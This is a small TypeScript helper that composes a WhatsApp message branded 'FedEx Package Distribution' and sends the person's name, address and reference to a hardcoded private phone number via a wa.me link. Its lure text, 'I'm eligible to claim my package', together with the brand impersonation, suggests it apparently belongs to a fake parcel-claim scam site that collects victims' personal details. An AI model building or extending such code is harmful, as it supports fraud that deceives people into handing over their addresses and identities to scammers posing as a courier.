const WHATSAPP_NUMBER = process.env.NEXT_PUBLIC_WHATSAPP_NUMBER || '2348034295030'

export function generateWhatsAppMessage(
  name: string,
  address: string,
  reference: string
): string {
  return `🎁 FedEx Package Distribution

Name: ${name}
Address: ${address}
Reference: ${reference}

I'm eligible to claim my package.`
}

export function getWhatsAppUrl(message: string): string {
  const encoded = encodeURIComponent(message)
  return `https://wa.me/${WHATSAPP_NUMBER}?text=${encoded}`
}
